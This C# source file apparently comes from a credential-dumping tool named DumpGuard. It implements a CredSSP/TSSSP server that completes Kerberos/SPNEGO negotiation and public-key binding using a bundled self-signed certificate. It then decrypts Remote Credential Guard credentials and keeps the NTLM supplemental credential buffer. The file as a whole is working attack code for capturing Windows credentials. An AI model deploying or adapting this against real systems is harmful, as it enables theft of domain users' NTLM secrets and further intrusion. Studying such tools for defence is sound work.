using DumpGuard.Kerberos;
using DumpGuard.Spnego;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Security.Cryptography;
using System.Text;
using static DumpGuard.Tsssp.TssspTypes;

namespace DumpGuard.Tsssp
{
    internal class TssspServer
    {
        public KerbServer Kerberos { get; set; }
        private SpnegoServer Spnego { get; set; }

        public byte[] NtlmCredBuffer { get; set; } = null;

        public TssspServer(string domain, string username, string password, string salt)
        {
            Kerberos = new KerbServer(domain, username, password, salt);
            Spnego = new SpnegoServer(Kerberos);
        }

        public bool AcceptSecurityContext(byte[] input, out byte[] output)
        {
            using (var TsRequestWrapper = Interop.DecodeObject<TSRequest>(input, TS_ASN1_PDU.TsRequest))
            {
                var TsRequest = TsRequestWrapper.Object;

                using (var ts_response = new TSRequest(TsRequest.Version))
                {
                    if (TsRequest.Flags.HasFlag(TSRequestFlags.NegoTokens))
                    {
                        if (AcceptNegoTokens(TsRequest.NegoTokens.ParseList(), out List<OCTET_STRING> nego_responses))
                            ts_response.SetNegoTokens(nego_responses);
                    }

                    if (TsRequest.Flags.HasFlag(TSRequestFlags.PubKeyAuth))
                    {
                        var public_key = Decrypt(TsRequest.PubKeyAuth.ToBytes());
                        var public_key_auth = public_key;

                        using (var cert = new X509Certificate2(Program.RcgTest_SelfSignedCert.Skip(4).ToArray()))
                        {
                            if (TsRequest.Version <= 4)
                            {
                                if (!public_key.SequenceEqual(cert.GetPublicKey()))
                                    throw new Exception("The client pubkey auth contained an incorrect public key");

                                if (TsRequest.Version > 1)
                                    public_key_auth[0] += 1;
                                else
                                {
                                    var increment = BitConverter.GetBytes(BitConverter.ToUInt32(public_key_auth, 0) + 1);
                                    Array.Copy(increment, public_key_auth, increment.Length);
                                }
                            }
                            else
                            {
                                if (!public_key.SequenceEqual(CalculateBindingHash(TsRequest.ClientNonce.ToBytes(), cert.GetPublicKey(), true)))
                                    throw new Exception("The client pubkey auth contained a hash for an incorrect public key");

                                public_key_auth = CalculateBindingHash(TsRequest.ClientNonce.ToBytes(), cert.GetPublicKey(), false);
                            }
                        }

                        ts_response.SetPubKeyAuth(Encrypt(public_key_auth));
                    }

                    if (TsRequest.Flags.HasFlag(TSRequestFlags.AuthInfo))
                    {
                        var auth_info = Decrypt(TsRequest.AuthInfo.ToBytes());

                        using (var TsCredentialsWrapper = Interop.DecodeObject<TSCredentials>(auth_info, TS_ASN1_PDU.TsCredentials))
                        {
                            var TsCredentials = TsCredentialsWrapper.Object;

                            if (TsCredentials.CredType != TSCREDENTIAL_TYPE.RemoteGuard)
                                throw new Exception($"Received unexpected credential type: {TsCredentials.CredType}");

                            using (var TsRemoteGuardCredsWrapper = Interop.DecodeObject<TSRemoteGuardCreds>(TsCredentials.Credentials.ToBytes(), TS_ASN1_PDU.TsRemoteGuardCreds))
                            {
                                var TsRemoteGuardCreds = TsRemoteGuardCredsWrapper.Object;

                                if (!TsRemoteGuardCreds.Flags.HasFlag(TSRemoteGuardCredsFlags.SupplementalCreds))
                                    throw new Exception("TsRemoteGuardCreds does not have any supplemental credentials");

                                foreach (var supplemental_cred in TsRemoteGuardCreds.SupplementalCreds.ParseList())
                                {
                                    if (Encoding.Unicode.GetString(supplemental_cred.PackageName.ToBytes()).Equals("NTLM"))
                                        NtlmCredBuffer = supplemental_cred.CredBuffer.ToBytes();
                                }
                            }
                        }
                    }

                    if (ts_response.Flags == TSRequestFlags.None)
                    {
                        output = null;
                        return true;
                    }
                    else
                    {
                        output = Interop.EncodeObject(ts_response, TS_ASN1_PDU.TsRequest);
                        return false;
                    }
                }
            }
        }

        private bool AcceptNegoTokens(IEnumerable<OCTET_STRING> NegoTokens, out List<OCTET_STRING> NegoResponses)
        {
            NegoResponses = new List<OCTET_STRING>();

            foreach (var token in NegoTokens)
            {
                if (Spnego.AcceptNegotiationToken(token.ToBytes(), out byte[] resp_token))
                    return false;

                NegoResponses.Add(new OCTET_STRING(resp_token));
            }

            return true;
        }

        private byte[] CalculateBindingHash(byte[] client_nonce, byte[] public_key, bool client_or_server)
        {
            var client_binding = Encoding.ASCII.GetBytes("CredSSP Client-To-Server Binding Hash\0");
            var server_binding = Encoding.ASCII.GetBytes("CredSSP Server-To-Client Binding Hash\0");

            using (var sha256 = SHA256.Create())
            {
                return sha256.ComputeHash((client_or_server ? client_binding : server_binding).Concat(client_nonce).Concat(public_key).ToArray());
            }
        }

        public byte[] Encrypt(byte[] data)
        {
            return Kerberos.KerbSealMessageOld(data);
        }

        public byte[] Decrypt(byte[] data)
        {
            return Kerberos.KerbUnsealMessageOld(data);
        }
    }
}
